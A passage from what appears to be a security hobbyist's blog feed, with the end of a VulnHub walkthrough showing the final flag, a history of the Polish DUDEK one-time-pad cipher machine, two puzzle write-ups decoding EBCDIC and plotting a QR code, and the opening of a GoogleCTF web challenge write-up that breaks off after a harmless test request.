&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root    1 Dec 27  2016 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Oct 22  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 root root  510 Dec 27  2016 check_level.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  342 Dec 16  2016 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   18 Dec 15  2016 .mysql_history
drwxr-xr-x  2 root root 4096 Dec 15  2016 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  148 Aug 17  2015 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   66 Dec 15  2016 .selected_editor
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  214 Dec 16  2016 .wget-hsts
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;c&quot;&gt;###CONGRATULATIONS###&lt;/span&gt;

You beat part 1 of 2 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the &lt;span class=&quot;s2&quot;&gt;&quot;Wallaby's Worst Knightmare&quot;&lt;/span&gt; series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you find any errors or interesting ways to root, I&lt;span class=&quot;s1&quot;&gt;'d love to hear about it.

Thanks guys!
-Waldo&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have the final flag, and the game is over. It was anothers great and educational machine from &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;Vulnhub&lt;/a&gt;. Thanks &lt;a href=&quot;https://www.arashparsa.com/&quot;&gt;Waldo&lt;/a&gt;!&lt;/p&gt;
</description>
        <pubDate>Sun, 16 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-wallabys-nightmare/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-wallabys-nightmare/</guid>
      </item>
    
      <item>
        <title>Dudek - Polish Cipher Machine</title>
        <description>&lt;p&gt;Everyone should have heard about involvment of Polish cryptographers in breaking Enigma. But there's another great story containing cryptography - &lt;b&gt;DUDEK&lt;/b&gt; cipher machine. &lt;/p&gt;

&lt;p&gt;After World War II, Polish People’s Republic was in need of system protecting undisclosed information. This task was assigned to Cipher Bureau of Ministry of Internal Affairs, so called &lt;b&gt;&quot;A&quot; Bureau&lt;/b&gt;. Many years of conducting research in cryptography and cryptanalysis, development of technologies made it the most specialized unit in whole country. Its history is still not fully revealed, but we know that in 1968 Bureau contained 5 departments and 2 independent sections. &lt;/p&gt;

&lt;p&gt;In 1964, Wielkopolskie Telecommunication Factory T-7 Teletra together with Cipher Bureau planned and developed a new cryptographic device called &lt;b&gt;TgS-1 DUDEK&lt;/b&gt; - acronym for &lt;b&gt;Dalekopisowe Urządzenie Do Elektronicznego Kodowania&lt;/b&gt; (Teleprinter Device for Electronic Coding). &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/teletra.jpg&quot; alt=&quot;Teletra Factory&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt; Wielkopolskie Telecommunication Factory T-7 Teletra&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;For encryption and decryption, it used Vernam Cipher, developed in 1918 by &lt;b&gt;Gilbert Sandford Vernam&lt;/b&gt;, and also known as One-Time Tape (OTT). In order to use OTT, you need 2 copies of the key (also known as pad), which have to be truely random data at least as long as the message. One copy of the key is kept by a user, second one has to be shared via secure channel, like meeting face to face. Then, to encrypt our data, we take corresponding characters of the message and pad, XOR them giving the first letter of the ciphertext and move on to the next characters. Recipient, after receaving the message has to reverse this operation - XOR each letter of ciphertext with each letter of the pad. Once used, pads must be completely destroyed to keep the security of the cipher. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-machine.jpg&quot; alt=&quot;Dudek Machine&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;TgS-1 DUDEK&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;The pad must be composed of truly random data, it must never be used more than once and it must be kept secure. If it's used correctly one-time pad is truely unbreakable system. But what happens when the key is used more than once?&lt;/p&gt;

&lt;p&gt;Soviet intelligence encrypted their communications with their agents in Britain using one-time pad. Cryptanalysists from &lt;b&gt;project Verona&lt;/b&gt;, which was a counterintelligence program initiated by the United States Army's Signal Intelligence Service, revealed that some of the one-time pad material had been incorrectly reused by the Soviets. In result, over a period of years, various secret communications were compromised. &lt;/p&gt;

&lt;p&gt;Altough we may think that nowadays it's easy to compute random numbers, it's actually still very hard task. Current pseudo-random generators rely on the state of the machine, input-output or even network state. As a result, in practice most personal computers are not able to produce true randomness. That's where &lt;b&gt;True Random Numbers Generators&lt;/b&gt; come in. It's a device that works on generating random numbers using physical processes such as thermal noise, quantum optics or photoelectric effects. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/trng.jpg&quot; alt=&quot;TRNG&quot; width=&quot;50%&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Example of TRNG&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;As we now know how Vernam Cipher works, let's come back to DUDEK. It was part of the teleprinter machine, suitable of encrypting and decrypting telegraphic character. Data could be entered manually, or using built in scanner, and it was sent with speed of 50 to 75 bits per second. Whole machine weighted 35kg with dimensions of 540x260x400mm in first version, or lighter 32kg mobile version TgS-1M with dimensions of 500x250x390mm. &lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TgS-1 - basic version known in DDR as T-352&lt;/li&gt;
  &lt;li&gt;TgS-1M - mobile version known in DDR as T-353&lt;/li&gt;
  &lt;li&gt;TgS-1MS - mobile version&lt;/li&gt;
  &lt;li&gt;TgS-3 - newer version introduced in 1980 which used TTL logic&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-controls.png&quot; alt=&quot;Dudek Controls&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Dudek Controls&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-interior.jpg&quot; alt=&quot;Dudek Interior&quot; width=&quot;50%&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Interior of Dudek machine&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;As opposed to other devices in the sixites, DUDEK was built using magnetic core logic building blocks of the so-called UNILOG-30 family. By using a toriod cores with several windings, it was possible to create the basic logic gates, such as AND, OR, XOR and Inverter circuits. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dudek-crypto/dudek-plans.jpg&quot; alt=&quot;Dudek Circuit&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Circuit of TgS-1 DUDEK&lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Because of it's top secret cleareance, DUDEK was used almost in every special forces of the Ministry of Internal Affairs, Ministry of Foreign Affairs, Ministry of Defence, police and the National Bank of Poland. It is known that in 1986 there were already 1070 of such devices, and it was produced up until 2000, when the last units were pulled back from the police stations. &lt;/p&gt;

&lt;p&gt;These machines were very longevous, as they were expected to work at least 20 years. The last DUDEK was retired from a police station in 2011, while many machines still work in the museums. Unfortunately this project has to be closed, as research teams were shut, Teletra was sold to Alcatel and went bankrupt. At the same time computers and internet started to appear in Poland leading to the final decline. &lt;/p&gt;

&lt;h1&gt;Last Words&lt;/h1&gt;

&lt;p&gt;For me it's always amazing to hear such stories, especially stories that aren't widely heard even in the country of origin. That's why I wanted to write about this topic, holding together huge number of 5 references and somehow glue them together. But as always I hope you enjoyed and learned something new! &lt;/p&gt;

&lt;h1&gt;References&lt;/h1&gt;
&lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/DUDEK&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&quot;http://www.cyberdefence24.pl/398532,urzadzenie-szyfrujace-dudek-polska-enigma&quot;&gt;&lt;b&gt;Cyberdefence24 (PL)&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&quot;http://www.cryptomuseum.com/crypto/pl/dudek/index.htm&quot;&gt;&lt;b&gt;CryptoMuseum&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&quot;http://www.cs.miami.edu/home/burt/learning/Csc609.051/notes/02.html&quot;&gt;&lt;b&gt;CSMiami&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 04 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/tgs-1-dudek/</link>
        <guid isPermaLink="true">http://localhost:4000/tgs-1-dudek/</guid>
      </item>
    
      <item>
        <title>Gynvael Polish Mission 006</title>
        <description>&lt;p&gt;Another challenge from Gynvael's polish &lt;a href=&quot;https://www.youtube.com/watch?v=w-7vLvTKJbI&quot;&gt;stream&lt;/a&gt;. Let's see what we've got today.&lt;/p&gt;

&lt;pre&gt;
Mission 006            goo.gl/te47XT                  DIFFICULTY: ███░░░░░░░ [3/10]
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅
Looking through old documents from the sixties, we've noticed this note:

  c5 c2 c3 c4 c9 c3 40 82 a8 93 82 a8 40 86 81 91 95 a8 40 87 84
  a8 82 a8 40 82 a8 93 40 93 96 87 89 83 a9 95 a8 4b 40 c1 93 85
  40 95 89 85 40 91 85 a2 a3 4b

We're thinking that it's some sentence written in Polish, but we couldn't decode it. Now it's jour job to do it. Good luck!

--

If you decode the answer, put it in the comments under this video! If you write
a blogpost / post your solution online, please add a link in the comments too!

P.S. I'll show/explain the solution on the stream next week.
&lt;/pre&gt;

&lt;p&gt;Firstly, let's take a look at different types of encodings used in the sixties. From this &lt;a href=&quot;https://en.wikipedia.org/wiki/Character_encoding#History&quot;&gt;Wikipedia article&lt;/a&gt;, we can learn that: &lt;/p&gt;

&lt;pre&gt;
ASCII was introduced in 1963 and is a seven-bit encoding scheme used to encode letters, numerals, symbols, and device control codes as fixed-length codes using integers.
&lt;/pre&gt;

&lt;p&gt;But as we know it's not ASCII, we can skip to the next encoding sheme created also in 1963: &lt;/p&gt;

&lt;pre&gt;
IBM's Extended Binary Coded Decimal Interchange Code (usually abbreviated as EBCDIC) is an eight-bit encoding scheme developed in 1963.
&lt;/pre&gt;

&lt;p&gt;Now we have to check if it's actually this. Looking at this EBCDIC to ASCII table we can see that it will print out polish words, but let's also write a Python script to decode that. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/ebcdic-to-ascii.png&quot; alt=&quot;EBCDIC Table&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;codecs&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;c5 c2 c3 c4 c9 c3 40 82 a8 93 82 a8 40 86 81 91 95 a8 40 87 84 a8 82 a8 40 82 a8 93 40 93 96 87 89 83 a9 95 a8 4b 40 c1 93 85 40 95 89 85 40 91 85 a2 a3 4b&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;letter&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cp500&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Where &lt;b&gt;cp500&lt;/b&gt; is codec alias for EBCDIC-CP-BE, EBCDIC-CP-CH, IBM500. Running this script we get the message &lt;i&gt;EBCDIC bylby fajny gdyby byl logiczny. Ale nie jest.&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;This translates to &lt;i&gt;EBCDIC would be cool, if it was logical. But it's not.&lt;/i&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 29 Jun 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/gynvael-mission-6-polish/</link>
        <guid isPermaLink="true">http://localhost:4000/gynvael-mission-6-polish/</guid>
      </item>
    
      <item>
        <title>Gynvael Mission 006</title>
        <description>&lt;p&gt;Challenge from Gynvael's &lt;a href=&quot;https://www.youtube.com/watch?v=KvyBn4Btv8E&quot;&gt;stream&lt;/a&gt;. Let's take a look at it. &lt;/p&gt;
&lt;pre&gt;
Welcome back agent 1336.
No mail.
&amp;gt; mission --take
MISSION 006               goo.gl/Z4u9cv             DIFFICULTY: ███████░░░ [7╱10]
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅

Finally we hired a new secret agent and moved agent Huffman to do some harmless
paperwork. That's the good news. The bad news is that agent Huffman made it his
mission to train our new agent and this went exactly as expected - i.e. we cannot
decode the report received from the new agent.

Long story short, agent Huffman Junior sent us this file:

  http://goo.gl/S395x6

We don't really know how to decode it, nor do we care at this point. Please take
a look and decode it if you can.

GOOD LUCK!

If you decode the answer, put it in the comments under this video! If you write
a blogpost / post your solution online, please add a link in the comments too!

P.S. I'll show/explain the solution on the stream next week.
&lt;/pre&gt;

&lt;p&gt;After viewing the file, I can see something looking like coordinates. &lt;/p&gt;

&lt;pre&gt;
[11, 24]
[6, 6]
[18, 22]
[12, 10]
[24, 13]
[17, 14]
[12, 8]
&lt;/pre&gt;

&lt;p&gt;And after lots of math in this year, they quite remind me of vectors. By looking at the data, we can also assume that the biggest number is 24, so image should not be bigger than that. Now I decided to run another test, to see if all of the entries are unique and it's possible using Linux command line. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;w3ndige@w3ndige Programming]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;mission006.data | uniq &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;w3ndige@w3ndige Programming]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;mission006.data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly we pipe the file to the uniq tool that will print only unique entres, and save it to test file. After that we're going to run diff tool to see if there are any differences. And there are none, which means that the file is made of only unique entres. &lt;/p&gt;

&lt;p&gt;Now, if all my understaning is correct, we can start plotting them on a bitmap using Python. To make script a little easier I converted it to new format using Atom's find and replace :D &lt;/p&gt;

&lt;pre&gt;
11,24
6,6
18,22
&lt;/pre&gt;

&lt;p&gt;Now we're ready to write a script! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImageDraw&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mission006.data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;coords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;coords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RGB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;white&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;draw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ImageDraw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rectangle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;black&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And our flag image looks like QR Code now. Let's open it with Gimp to make it a little bigger. Wait, is it vertically flipped? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/qrcode.png&quot; alt=&quot;QR Code&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now it's much better, we can finally scan it. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Mirrored QR? Seriously?!&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Great challenge, I would like to thank Gynvael for his amazing streams and this fun task! &lt;/p&gt;
</description>
        <pubDate>Thu, 22 Jun 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/gynvael-mission-6/</link>
        <guid isPermaLink="true">http://localhost:4000/gynvael-mission-6/</guid>
      </item>
    
      <item>
        <title>GoogleCTF - Mindreader</title>
        <description>&lt;p&gt;GoogleCTF from this year was hard. I couldn't solve most of the challenges, the ones that I made took me a lot of time to finish. But that's why we're here, to learn from a good challenge and from mistakes made during attacks. That's why I'm looking forward to write ups for other challenges and I'm publishing ones for the challenges, that I have finished. Let's start from the one with biggest number of solves - mindreader. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Can you read my mind?

Challenge running at https://mindreader.web.ctfcompetition.com/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Quite descriptive, right?&lt;/p&gt;

&lt;h1&gt;Mindreader - Easy&lt;/h1&gt;

&lt;p&gt;Viewing the page provided in the challenge gives us a little input box. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Hello, what do you want to read?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Very simple, nothing hidden in the code, no external files so let's focus on the input. Entering some words, phrases in it doesn't seem to work - we always get redirected to the &lt;b&gt;Not Found&lt;/b&gt; page. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=flag

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

